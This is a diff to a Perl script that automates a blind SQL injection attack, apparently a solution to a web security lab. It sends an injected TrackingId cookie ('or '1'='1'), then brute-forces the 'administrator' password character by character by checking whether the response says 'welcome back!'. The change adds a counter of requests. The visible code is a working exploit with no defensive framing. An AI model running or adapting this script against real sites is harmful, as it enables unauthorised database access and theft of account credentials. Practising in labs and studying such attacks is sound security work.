@@ -66,6 +66,7 @@ say &makeRequest("TrackingId=' or '1'='1") ? colored("OK", "green") : colored("E
 
 say colored("[*] Obtaining password for user 'administrator', it may take a while... ", "cyan");
 
+our $requestCount = 0;
 my $password = '';
 my @chars = ('0'..'9', 'A'..'Z', 'a'..'z');
 for my $length (1..$maxLength) {
@@ -91,7 +92,7 @@ for my $length (1..$maxLength) {
     last if $length > length $password;
 }
 
-say colored("[*] Finished.", "bold magenta");
+say colored("[*] Finished in $requestCount requests.", "bold magenta");
 
 sub generatePayload {
     my $idx = shift;
@@ -104,6 +105,7 @@ sub generatePayload {
 sub makeRequest {
     my $payload = shift;
     my $response = $ua->get($url, 'Cookie' => $payload);
+    $requestCount++;
 
     if ($response->is_success) {
         return $response->decoded_content =~ /welcome back!/ig ? 1 : 0;
